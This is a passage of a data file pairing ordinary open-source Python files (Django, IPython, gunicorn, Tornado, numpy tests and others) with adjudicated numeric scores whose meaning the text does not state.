        klass.deconstruct = deconstruct

        return klass

    if not args:
        return decorator
    return decorator(*args)"
79	adjudicated	0	"from django import forms

from ckeditor.fields import RichTextFormField
from ckeditor.widgets import CKEditorWidget
from ckeditor_uploader.fields import RichTextUploadingFormField
from ckeditor_uploader.widgets import CKEditorUploadingWidget

from .models import ExampleModel, ExampleNonUploadModel
from .widgets import CkEditorMultiWidget


class CkEditorForm(forms.Form):
    ckeditor_standard_example = RichTextFormField()
    ckeditor_upload_example = RichTextUploadingFormField(
        config_name=""my-custom-toolbar""
    )


class CkEditorMultiWidgetForm(forms.Form):
    SUBWIDGET_SUFFIXES = [""0"", ""1""]

    ckeditor_standard_multi_widget_example = forms.CharField(
        widget=CkEditorMultiWidget(
            widgets={suffix: CKEditorWidget for suffix in SUBWIDGET_SUFFIXES},
        ),
    )
    ckeditor_upload_multi_widget_example = forms.CharField(
        widget=CkEditorMultiWidget(
            widgets={
                suffix: CKEditorUploadingWidget(config_name=""my-custom-toolbar"")
                for suffix in SUBWIDGET_SUFFIXES
            },
        ),
    )


class ExampleModelForm(forms.ModelForm):
    class Meta:
        model = ExampleModel
        fields = ""__all__""


class ExampleNonUploadModelForm(forms.ModelForm):
    class Meta:
        model = ExampleNonUploadModel
        fields = ""__all__""


class ExampleModelOverriddenWidgetForm(forms.ModelForm):
    class Meta:
        model = ExampleModel
        fields = ""__all__""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.fields[""content""].widget = CKEditorUploadingWidget(
            config_name=""my-custom-toolbar"",
            extra_plugins=[""someplugin"", ""anotherplugin""],
            external_plugin_resources=[
                (
                    ""someplugin"",
                    ""/static/path/to/someplugin/"",
                    ""plugin.js"",
                )
            ],
        )"
139	adjudicated	3	"# encoding: utf-8
""""""
Autocall capabilities for IPython.core.

Authors:

* Brian Granger
* Fernando Perez
* Thomas Kluyver

Notes
-----
""""""

#-----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Imports
#-----------------------------------------------------------------------------


#-----------------------------------------------------------------------------
# Code
#-----------------------------------------------------------------------------

class IPyAutocall(object):
    """""" Instances of this class are always autocalled
    
    This happens regardless of 'autocall' variable state. Use this to
    develop macro-like mechanisms.
    """"""
    _ip = None
    rewrite = True
    def __init__(self, ip=None):
        self._ip = ip
    
    def set_ip(self, ip):
        """"""Will be used to set _ip point to current ipython instance b/f call

        Override this method if you don't want this to happen.

        """"""
        self._ip = ip


class ExitAutocall(IPyAutocall):
    """"""An autocallable object which will be added to the user namespace so that
    exit, exit(), quit or quit() are all valid ways to close the shell.""""""
    rewrite = False
    
    def __call__(self):
        self._ip.ask_exit()
        
class ZMQExitAutocall(ExitAutocall):
    """"""Exit IPython. Autocallable, so it needn't be explicitly called.
    
    Parameters
    ----------
    keep_kernel : bool
      If True, leave the kernel alive. Otherwise, tell the kernel to exit too
      (default).
    """"""
    def __call__(self, keep_kernel=False):
        self._ip.keepkernel_on_exit = keep_kernel
        self._ip.ask_exit()"
28	adjudicated	0	"import traceback

class Symbol(object):
    def __init__(self, anchor, type, cppname):
        self.anchor = anchor
        self.type = type
        self.cppname = cppname
        #if anchor == 'ga586ebfb0a7fb604b35a23d85391329be':
        #    print(repr(self))
        #    traceback.print_stack()

    def __repr__(self):
        return '%s:%s@%s' % (self.type, self.cppname, self.anchor)

def add_to_file(files_dict, file, anchor):
    anchors = files_dict.setdefault(file, [])
    anchors.append(anchor)


def scan_namespace_constants(ns, ns_name, files_dict):
    constants = ns.findall(""./member[@kind='enumvalue']"")
    for c in constants:
        c_name = c.find(""./name"").text
        name = ns_name + '::' + c_name
        file = c.find(""./anchorfile"").text
        anchor = c.find(""./anchor"").text
        #print('    CONST: {} => {}#{}'.format(name, file, anchor))
        add_to_file(files_dict, file, Symbol(anchor, ""const"", name))

def scan_namespace_functions(ns, ns_name, files_dict):
    functions = ns.findall(""./member[@kind='function']"")
    for f in functions:
        f_name = f.find(""./name"").text
        name = ns_name + '::' + f_name
        file = f.find(""./anchorfile"").text
        anchor = f.find(""./anchor"").text
        #print('    FN: {} => {}#{}'.format(name, file, anchor))
        add_to_file(files_dict, file, Symbol(anchor, ""fn"", name))

def scan_class_methods(c, c_name, files_dict):
    methods = c.findall(""./member[@kind='function']"")
    for m in methods:
        m_name = m.find(""./name"").text
        name = c_name + '::' + m_name
        file = m.find(""./anchorfile"").text
        anchor = m.find(""./anchor"").text
        #print('    Method: {} => {}#{}'.format(name, file, anchor))
        add_to_file(files_dict, file, Symbol(anchor, ""method"", name))"
168	adjudicated	4	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory
from voltha.extensions.alarms.adapter_alarms import AlarmBase


class OnuEquipmentAlarm(AlarmBase):
    """"""
    The ONU Equipment Alarm is reported by both the CircuitPack (ME #6) and
    the ONT-G (ME # 256) to indicate failure on an internal interface or
    failed self-test.

    For CircuitPack equipment alarms, the intf_id reported is that of the
    UNI's logical port number

    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI
    physical port number

    Note: Some ONUs may use this alarm to report a self-test failure or may
          may report it with a different alarm number specifically for a
          self-test failure.
    """"""
    def __init__(self, alarm_mgr, onu_id, intf_id):
        super(OnuEquipmentAlarm, self).__init__(alarm_mgr, object_type='onu equipment',
                                                alarm='ONU_EQUIPMENT',
                                                alarm_category=AlarmEventCategory.ONU,
                                                alarm_type=AlarmEventType.EQUIPTMENT,
                                                alarm_severity=AlarmEventSeverity.CRITICAL)
        self._onu_id = onu_id
        self._intf_id = intf_id

    def get_context_data(self):
        return {'onu-id': self._onu_id,
                'onu-intf-id': self._intf_id}"
455	adjudicated	3	"# Copyright 2016 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from flask import Flask
import requests

import services_config

app = Flask(__name__)
services_config.init_app(app)


@app.route('/')
def root():
    """"""Gets index.html from the static file server""""""
    res = requests.get(app.config['SERVICE_MAP']['static'])
    return res.content


@app.route('/hello/<service>')
def say_hello(service):
    """"""Recieves requests from buttons on the front end and resopnds
    or sends request to the static file server""""""
    # If 'gateway' is specified return immediate
    if service == 'gateway':
        return 'Gateway says hello'

    # Otherwise send request to service indicated by URL param
    responses = []
    url = app.config['SERVICE_MAP'][service]
    res = requests.get(url + '/hello')
    responses.append(res.content)
    return '\n'.encode().join(responses)


@app.route('/<path>')
def static_file(path):
    """"""Gets static files required by index.html to static file server""""""
    url = app.config['SERVICE_MAP']['static']
    res = requests.get(url + '/' + path)
    return res.content, 200, {'Content-Type': res.headers['Content-Type']}


if __name__ == '__main__':
    # This is used when running locally. Gunicorn is used to run the
    # application on Google App Engine. See entrypoint in app.yaml.
    app.run(host='127.0.0.1', port=8000, debug=True)"
515	adjudicated	0	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._visible import VisibleValidator
    from ._type import TypeValidator
    from ._templateitemname import TemplateitemnameValidator
    from ._symbol import SymbolValidator
    from ._sourcetype import SourcetypeValidator
    from ._sourcelayer import SourcelayerValidator
    from ._sourceattribution import SourceattributionValidator
    from ._source import SourceValidator
    from ._opacity import OpacityValidator
    from ._name import NameValidator
    from ._minzoom import MinzoomValidator
    from ._maxzoom import MaxzoomValidator
    from ._line import LineValidator
    from ._fill import FillValidator
    from ._coordinates import CoordinatesValidator
    from ._color import ColorValidator
    from ._circle import CircleValidator
    from ._below import BelowValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._visible.VisibleValidator"",
            ""._type.TypeValidator"",
            ""._templateitemname.TemplateitemnameValidator"",
            ""._symbol.SymbolValidator"",
            ""._sourcetype.SourcetypeValidator"",
            ""._sourcelayer.SourcelayerValidator"",
            ""._sourceattribution.SourceattributionValidator"",
            ""._source.SourceValidator"",
            ""._opacity.OpacityValidator"",
            ""._name.NameValidator"",
            ""._minzoom.MinzoomValidator"",
            ""._maxzoom.MaxzoomValidator"",
            ""._line.LineValidator"",
            ""._fill.FillValidator"",
            ""._coordinates.CoordinatesValidator"",
            ""._color.ColorValidator"",
            ""._circle.CircleValidator"",
            ""._below.BelowValidator"",
        ],
    )"
404	adjudicated	3	"#
# The Python Imaging Library.
# $Id$
#
# sequence support classes
#
# history:
# 1997-02-20 fl     Created
#
# Copyright (c) 1997 by Secret Labs AB.
# Copyright (c) 1997 by Fredrik Lundh.
#
# See the README file for information on usage and redistribution.
#

##


class Iterator:
    """"""
    This class implements an iterator object that can be used to loop
    over an image sequence.

    You can use the ``[]`` operator to access elements by index. This operator
    will raise an :py:exc:`IndexError` if you try to access a nonexistent
    frame.

    :param im: An image object.
    """"""

    def __init__(self, im):
        if not hasattr(im, ""seek""):
            msg = ""im must have seek method""
            raise AttributeError(msg)
        self.im = im
        self.position = getattr(self.im, ""_min_frame"", 0)

    def __getitem__(self, ix):
        try:
            self.im.seek(ix)
            return self.im
        except EOFError as e:
            raise IndexError from e  # end of sequence

    def __iter__(self):
        return self

    def __next__(self):
        try:
            self.im.seek(self.position)
            self.position += 1
            return self.im
        except EOFError as e:
            raise StopIteration from e


def all_frames(im, func=None):
    """"""
    Applies a given function to all frames in an image or a list of images.
    The frames are returned as a list of separate images.

    :param im: An image, or a list of images.
    :param func: The function to apply to all of the image frames.
    :returns: A list of images.
    """"""
    if not isinstance(im, list):
        im = [im]

    ims = []
    for imSequence in im:
        current = imSequence.tell()

        ims += [im_frame.copy() for im_frame in Iterator(imSequence)]

        imSequence.seek(current)
    return [func(im) for im in ims] if func else ims"
492	adjudicated	1	"#
# download_mks_assets.py
# Added by HAS_TFT_LVGL_UI to download assets from Makerbase repo
#
import pioutil
if pioutil.is_pio_build():
    Import(""env"")
    import requests,zipfile,tempfile,shutil
    from pathlib import Path

    url = ""https://github.com/makerbase-mks/Mks-Robin-Nano-Marlin2.0-Firmware/archive/0263cdaccf.zip""
    deps_path = Path(env.Dictionary(""PROJECT_LIBDEPS_DIR""))
    zip_path = deps_path / ""mks-assets.zip""
    assets_path = Path(env.Dictionary(""PROJECT_BUILD_DIR""), env.Dictionary(""PIOENV""), ""assets"")

    def download_mks_assets():
        print(""Downloading MKS Assets"")
        r = requests.get(url, stream=True)
        # the user may have a very clean workspace,
        # so create the PROJECT_LIBDEPS_DIR directory if not exits
        if not deps_path.exists():
            deps_path.mkdir()
        with zip_path.open('wb') as fd:
            for chunk in r.iter_content(chunk_size=128):
                fd.write(chunk)

    def copy_mks_assets():
        print(""Copying MKS Assets"")
        output_path = Path(tempfile.mkdtemp())
        zip_obj = zipfile.ZipFile(zip_path, 'r')
        zip_obj.extractall(output_path)
        zip_obj.close()
        if assets_path.exists() and not assets_path.is_dir():
            assets_path.unlink()
        if not assets_path.exists():
            assets_path.mkdir()
        base_path = ''
        for filename in output_path.iterdir():
            base_path = filename
        fw_path = (output_path / base_path / 'Firmware')
        font_path = fw_path / 'mks_font'
        for filename in font_path.iterdir():
            shutil.copy(font_path / filename, assets_path)
        pic_path = fw_path / 'mks_pic'
        for filename in pic_path.iterdir():
            shutil.copy(pic_path / filename, assets_path)
        shutil.rmtree(output_path, ignore_errors=True)

    if not zip_path.exists():
        download_mks_assets()

    if not assets_path.exists():
        copy_mks_assets()"
430	adjudicated	4	"import os

from _pydev_bundle import pydev_log
from _pydevd_bundle.pydevd_trace_dispatch import USING_CYTHON
from _pydevd_bundle.pydevd_constants import USE_CYTHON_FLAG, ENV_FALSE_LOWER_VALUES, \
    ENV_TRUE_LOWER_VALUES, IS_PY36_OR_GREATER, IS_PY38_OR_GREATER, SUPPORT_GEVENT, IS_PYTHON_STACKLESS, \
    PYDEVD_USE_FRAME_EVAL, PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING

frame_eval_func = None
stop_frame_eval = None
dummy_trace_dispatch = None
clear_thread_local_info = None

# ""NO"" means we should not use frame evaluation, 'YES' we should use it (and fail if not there) and unspecified uses if possible.
if (
        PYDEVD_USE_FRAME_EVAL in ENV_FALSE_LOWER_VALUES or
        USE_CYTHON_FLAG in ENV_FALSE_LOWER_VALUES or
        not USING_CYTHON or

        # Frame eval mode does not work with ipython compatible debugging (this happens because the
        # way that frame eval works is run untraced and set tracing only for the frames with
        # breakpoints, but ipython compatible debugging creates separate frames for what's logically
        # the same frame).
        PYDEVD_IPYTHON_COMPATIBLE_DEBUGGING
    ):
    USING_FRAME_EVAL = False

elif SUPPORT_GEVENT or (IS_PYTHON_STACKLESS and not IS_PY38_OR_GREATER):
    USING_FRAME_EVAL = False
    # i.e gevent and frame eval mode don't get along very well.
    # https://github.com/microsoft/debugpy/issues/189
    # Same problem with Stackless.
    # https://github.com/stackless-dev/stackless/issues/240

elif PYDEVD_USE_FRAME_EVAL in ENV_TRUE_LOWER_VALUES:
    # Fail if unable to use
    from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info
    USING_FRAME_EVAL = True

else:
    USING_FRAME_EVAL = False
    # Try to use if possible
    if IS_PY36_OR_GREATER:
        try:
            from _pydevd_frame_eval.pydevd_frame_eval_cython_wrapper import frame_eval_func, stop_frame_eval, dummy_trace_dispatch, clear_thread_local_info
            USING_FRAME_EVAL = True
        except ImportError:
            pydev_log.show_compile_cython_command_line()"
461	adjudicated	1	"#!/usr/bin/env python3

# Copyright (c) 2012 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

"""""" Unit tests for the ninja.py file. """"""

import sys
import unittest

import gyp.generator.ninja as ninja


class TestPrefixesAndSuffixes(unittest.TestCase):
    def test_BinaryNamesWindows(self):
        # These cannot run on non-Windows as they require a VS installation to
        # correctly handle variable expansion.
        if sys.platform.startswith(""win""):
            writer = ninja.NinjaWriter(
                ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""win""
            )
            spec = {""target_name"": ""wee""}
            self.assertTrue(
                writer.ComputeOutputFileName(spec, ""executable"").endswith("".exe"")
            )
            self.assertTrue(
                writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".dll"")
            )
            self.assertTrue(
                writer.ComputeOutputFileName(spec, ""static_library"").endswith("".lib"")
            )

    def test_BinaryNamesLinux(self):
        writer = ninja.NinjaWriter(
            ""foo"", ""wee"", ""."", ""."", ""build.ninja"", ""."", ""build.ninja"", ""linux""
        )
        spec = {""target_name"": ""wee""}
        self.assertTrue(""."" not in writer.ComputeOutputFileName(spec, ""executable""))
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""shared_library"").startswith(""lib"")
        )
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""static_library"").startswith(""lib"")
        )
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""shared_library"").endswith("".so"")
        )
        self.assertTrue(
            writer.ComputeOutputFileName(spec, ""static_library"").endswith("".a"")
        )


if __name__ == ""__main__"":
    unittest.main()"
501	adjudicated	3	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for destroying a secret version.
""""""

import argparse


# [START secretmanager_destroy_secret_version]
def destroy_secret_version(project_id, secret_id, version_id):
    """"""
    Destroy the given secret version, making the payload irrecoverable. Other
    secrets versions are unaffected.
    """"""

    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret version
    name = f""projects/{project_id}/secrets/{secret_id}/versions/{version_id}""

    # Destroy the secret version.
    response = client.destroy_secret_version(request={""name"": name})

    print(""Destroyed secret version: {}"".format(response.name))
    # [END secretmanager_destroy_secret_version]

    return response


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(""project_id"", help=""id of the GCP project"")
    parser.add_argument(""secret_id"", help=""id of the secret from which to act"")
    parser.add_argument(""version_id"", help=""id of the version to destroy"")
    args = parser.parse_args()

    destroy_secret_version(args.project_id, args.secret_id, args.version_id)"
441	adjudicated	4	"""""""
PostGIS to GDAL conversion constant definitions
""""""
# Lookup to convert pixel type values from GDAL to PostGIS
GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]

# Lookup to convert pixel type values from PostGIS to GDAL
POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]

# Struct pack structure for raster header, the raster header has the
# following structure:
#
# Endianness, PostGIS raster version, number of bands, scale, origin,
# skew, srid, width, and height.
#
# Scale, origin, and skew have x and y values. PostGIS currently uses
# a fixed endianness (1) and there is only one version (0).
POSTGIS_HEADER_STRUCTURE = ""B H H d d d d d d i H H""

# Lookup values to convert GDAL pixel types to struct characters. This is
# used to pack and unpack the pixel values of PostGIS raster bands.
GDAL_TO_STRUCT = [
    None,
    ""B"",
    ""H"",
    ""h"",
    ""L"",
    ""l"",
    ""f"",
    ""d"",
    None,
    None,
    None,
    None,
]

# Size of the packed value in bytes for different numerical types.
# This is needed to cut chunks of band data out of PostGIS raster strings
# when decomposing them into GDALRasters.
# See https://docs.python.org/library/struct.html#format-characters
STRUCT_SIZE = {
    ""b"": 1,  # Signed char
    ""B"": 1,  # Unsigned char
    ""?"": 1,  # _Bool
    ""h"": 2,  # Short
    ""H"": 2,  # Unsigned short
    ""i"": 4,  # Integer
    ""I"": 4,  # Unsigned Integer
    ""l"": 4,  # Long
    ""L"": 4,  # Unsigned Long
    ""f"": 4,  # Float
    ""d"": 8,  # Double
}

# Pixel type specifies type of pixel values in a band. Storage flag specifies
# whether the band data is stored as part of the datum or is to be found on the
# server's filesystem. There are currently 11 supported pixel value types, so 4
# bits are enough to account for all. Reserve the upper 4 bits for generic
# flags. See
# https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag
BANDTYPE_PIXTYPE_MASK = 0x0F
BANDTYPE_FLAG_HASNODATA = 1 << 6"
410	adjudicated	1	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/Spinner.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/Spinner.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\x1dstreamlit/proto/Spinner.proto\""\x17\n\x07Spinner\x12\x0c\n\x04text\x18\x01 \x01(\tb\x06proto3'
)




_SPINNER = _descriptor.Descriptor(
  name='Spinner',
  full_name='Spinner',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='text', full_name='Spinner.text', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=b"""".decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=33,
  serialized_end=56,
)

DESCRIPTOR.message_types_by_name['Spinner'] = _SPINNER
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

Spinner = _reflection.GeneratedProtocolMessageType('Spinner', (_message.Message,), {
  'DESCRIPTOR' : _SPINNER,
  '__module__' : 'streamlit.proto.Spinner_pb2'
  # @@protoc_insertion_point(class_scope:Spinner)
  })
_sym_db.RegisterMessage(Spinner)


# @@protoc_insertion_point(module_scope)"
424	adjudicated	1	"""""""Test markdown rendering""""""


from nbformat.v4 import new_markdown_cell

from .utils import EDITOR_PAGE


def get_rendered_contents(nb):
    # TODO: Encapsulate element access/refactor so we're not accessing playwright element objects
    cl = [""text_cell"", ""render""]
    rendered_cells = [cell.locate("".text_cell_render"")
                      for cell in nb.cells
                      if all([c in cell.get_attribute(""class"") for c in cl])]
    return [x.get_inner_html().strip()
            for x in rendered_cells
            if x is not None]


def test_markdown_cell(prefill_notebook):
    notebook_frontend = prefill_notebook([new_markdown_cell(md) for md in [
        '# Foo', '**Bar**', '*Baz*', '```\nx = 1\n```', '```aaaa\nx = 1\n```',
        '```python\ns = ""$""\nt = ""$""\n```'
    ]])

    assert get_rendered_contents(notebook_frontend) == [
        '<h1 id=""Foo"">Foo<a class=""anchor-link"" href=""#Foo"">Â¶</a></h1>',
        '<p><strong>Bar</strong></p>',
        '<p><em>Baz</em></p>',
        '<pre><code>x = 1</code></pre>',
        '<pre><code class=""cm-s-ipython language-aaaa"">x = 1</code></pre>',
        '<pre><code class=""cm-s-ipython language-python"">' +
        '<span class=""cm-variable"">s</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span>\n' +
        '<span class=""cm-variable"">t</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span></code></pre>'
    ]


def test_markdown_headings(notebook_frontend):
    for i in [1, 2, 3, 4, 5, 6, 2, 1]:
        notebook_frontend.add_markdown_cell()
        cell_text = notebook_frontend.evaluate(f""""""
            var cell = IPython.notebook.get_cell(1);
            cell.set_heading_level({i});
            cell.get_text();
        """""", page=EDITOR_PAGE)
        assert notebook_frontend.get_cell_contents(1) == ""#"" * i + "" ""
        notebook_frontend.delete_cell(1)"
475	adjudicated	1	"from rx.core import ObservableBase, Observer, AnonymousObserver, Disposable
from rx.disposables import CompositeDisposable

from .subscription import Subscription
from .reactive_assert import AssertList


class ColdObservable(ObservableBase):
    def __init__(self, scheduler, messages):
        super(ColdObservable, self).__init__()

        self.scheduler = scheduler
        self.messages = messages
        self.subscriptions = AssertList()

    def subscribe(self, on_next=None, on_error=None, on_completed=None, observer=None):
        # Be forgiving and accept an un-named observer as first parameter
        if isinstance(on_next, Observer):
            observer = on_next
        elif not observer:
            observer = AnonymousObserver(on_next, on_error, on_completed)

        return self._subscribe_core(observer)

    def _subscribe_core(self, observer):
        clock = self.scheduler.to_relative(self.scheduler.now)
        self.subscriptions.append(Subscription(clock))
        index = len(self.subscriptions) - 1
        disposable = CompositeDisposable()

        def get_action(notification):
            def action(scheduler, state):
                notification.accept(observer)
                return Disposable.empty()
            return action

        for message in self.messages:
            notification = message.value

            # Don't make closures within a loop
            action = get_action(notification)
            disposable.add(self.scheduler.schedule_relative(message.time, action))

        def dispose():
            start = self.subscriptions[index].subscribe
            end = self.scheduler.to_relative(self.scheduler.now)
            self.subscriptions[index] = Subscription(start, end)
            disposable.dispose()

        return Disposable.create(dispose)"
486	adjudicated	1	"import socket
import typing

from tornado.http1connection import HTTP1Connection
from tornado.httputil import HTTPMessageDelegate
from tornado.iostream import IOStream
from tornado.locks import Event
from tornado.netutil import add_accept_handler
from tornado.testing import AsyncTestCase, bind_unused_port, gen_test


class HTTP1ConnectionTest(AsyncTestCase):
    code = None  # type: typing.Optional[int]

    def setUp(self):
        super().setUp()
        self.asyncSetUp()

    @gen_test
    def asyncSetUp(self):
        listener, port = bind_unused_port()
        event = Event()

        def accept_callback(conn, addr):
            self.server_stream = IOStream(conn)
            self.addCleanup(self.server_stream.close)
            event.set()

        add_accept_handler(listener, accept_callback)
        self.client_stream = IOStream(socket.socket())
        self.addCleanup(self.client_stream.close)
        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]
        self.io_loop.remove_handler(listener)
        listener.close()

    @gen_test
    def test_http10_no_content_length(self):
        # Regression test for a bug in which can_keep_alive would crash
        # for an HTTP/1.0 (not 1.1) response with no content-length.
        conn = HTTP1Connection(self.client_stream, True)
        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")
        self.server_stream.close()

        event = Event()
        test = self
        body = []

        class Delegate(HTTPMessageDelegate):
            def headers_received(self, start_line, headers):
                test.code = start_line.code

            def data_received(self, data):
                body.append(data)

            def finish(self):
                event.set()

        yield conn.read_response(Delegate())
        yield event.wait()
        self.assertEqual(self.code, 200)
        self.assertEqual(b"""".join(body), b""hello"")"
8	adjudicated	0	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import io
import os

# Classes that can undo reading data from
# a given type of data source.


class Unreader(object):
    def __init__(self):
        self.buf = io.BytesIO()

    def chunk(self):
        raise NotImplementedError()

    def read(self, size=None):
        if size is not None and not isinstance(size, int):
            raise TypeError(""size parameter must be an int or long."")

        if size is not None:
            if size == 0:
                return b""""
            if size < 0:
                size = None

        self.buf.seek(0, os.SEEK_END)

        if size is None and self.buf.tell():
            ret = self.buf.getvalue()
            self.buf = io.BytesIO()
            return ret
        if size is None:
            d = self.chunk()
            return d

        while self.buf.tell() < size:
            chunk = self.chunk()
            if not chunk:
                ret = self.buf.getvalue()
                self.buf = io.BytesIO()
                return ret
            self.buf.write(chunk)
        data = self.buf.getvalue()
        self.buf = io.BytesIO()
        self.buf.write(data[size:])
        return data[:size]

    def unread(self, data):
        self.buf.seek(0, os.SEEK_END)
        self.buf.write(data)


class SocketUnreader(Unreader):
    def __init__(self, sock, max_chunk=8192):
        super().__init__()
        self.sock = sock
        self.mxchunk = max_chunk

    def chunk(self):
        return self.sock.recv(self.mxchunk)


class IterUnreader(Unreader):
    def __init__(self, iterable):
        super().__init__()
        self.iter = iter(iterable)

    def chunk(self):
        if not self.iter:
            return b""""
        try:
            return next(self.iter)
        except StopIteration:
            self.iter = None
            return b"""""
399	adjudicated	3	"# PermWrapper and PermLookupDict proxy the permissions system into objects that
# the template system can understand.


class PermLookupDict:
    def __init__(self, user, app_label):
        self.user, self.app_label = user, app_label

    def __repr__(self):
        return str(self.user.get_all_permissions())

    def __getitem__(self, perm_name):
        return self.user.has_perm(""%s.%s"" % (self.app_label, perm_name))

    def __iter__(self):
        # To fix 'item in perms.someapp' and __getitem__ interaction we need to
        # define __iter__. See #18979 for details.
        raise TypeError(""PermLookupDict is not iterable."")

    def __bool__(self):
        return self.user.has_module_perms(self.app_label)


class PermWrapper:
    def __init__(self, user):
        self.user = user

    def __getitem__(self, app_label):
        return PermLookupDict(self.user, app_label)

    def __iter__(self):
        # I am large, I contain multitudes.
        raise TypeError(""PermWrapper is not iterable."")

    def __contains__(self, perm_name):
        """"""
        Lookup by ""someapp"" or ""someapp.someperm"" in perms.
        """"""
        if '.' not in perm_name:
            # The name refers to module.
            return bool(self[perm_name])
        app_label, perm_name = perm_name.split('.', 1)
        return self[app_label][perm_name]


def auth(request):
    """"""
    Return context variables required by apps that use Django's authentication
    system.

    If there is no 'user' attribute in the request, use AnonymousUser (from
    django.contrib.auth).
    """"""
    if hasattr(request, 'user'):
        user = request.user
    else:
        from django.contrib.auth.models import AnonymousUser
        user = AnonymousUser()

    return {
        'user': user,
        'perms': PermWrapper(user),
    }"
148	adjudicated	0	"import pytest

from numpy import array
from . import util


class TestReturnLogical(util.F2PyTest):
    def check_function(self, t):
        assert t(True) == 1
        assert t(False) == 0
        assert t(0) == 0
        assert t(None) == 0
        assert t(0.0) == 0
        assert t(0j) == 0
        assert t(1j) == 1
        assert t(234) == 1
        assert t(234.6) == 1
        assert t(234.6 + 3j) == 1
        assert t(""234"") == 1
        assert t(""aaa"") == 1
        assert t("""") == 0
        assert t([]) == 0
        assert t(()) == 0
        assert t({}) == 0
        assert t(t) == 1
        assert t(-234) == 1
        assert t(10**100) == 1
        assert t([234]) == 1
        assert t((234, )) == 1
        assert t(array(234)) == 1
        assert t(array([234])) == 1
        assert t(array([[234]])) == 1
        assert t(array([127], ""b"")) == 1
        assert t(array([234], ""h"")) == 1
        assert t(array([234], ""i"")) == 1
        assert t(array([234], ""l"")) == 1
        assert t(array([234], ""f"")) == 1
        assert t(array([234], ""d"")) == 1
        assert t(array([234 + 3j], ""F"")) == 1
        assert t(array([234], ""D"")) == 1
        assert t(array(0)) == 0
        assert t(array([0])) == 0
        assert t(array([[0]])) == 0
        assert t(array([0j])) == 0
        assert t(array([1])) == 1
        pytest.raises(ValueError, t, array([0, 0]))


class TestFReturnLogical(TestReturnLogical):
    sources = [
        util.getpath(""tests"", ""src"", ""return_logical"", ""foo77.f""),
        util.getpath(""tests"", ""src"", ""return_logical"", ""foo90.f90""),
    ]

    @pytest.mark.slow
